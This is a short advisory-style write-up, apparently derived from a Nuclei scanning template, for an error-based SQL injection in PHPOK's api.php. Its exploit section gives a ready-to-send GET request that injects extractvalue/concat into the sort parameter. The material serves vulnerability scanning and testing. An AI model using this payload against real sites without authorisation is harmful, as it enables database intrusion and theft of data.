# Nuclei Template: PHPOK - SQL Injection
**Template ID:** phpok-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`phpok-sqli.yaml`)

## Vulnerability Information & PoC

## Description
PHPOK contains a SQL injection vulnerability via a GET request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{num}}))) --+
```

## References
- https://cve.report/software/phpok/phpok
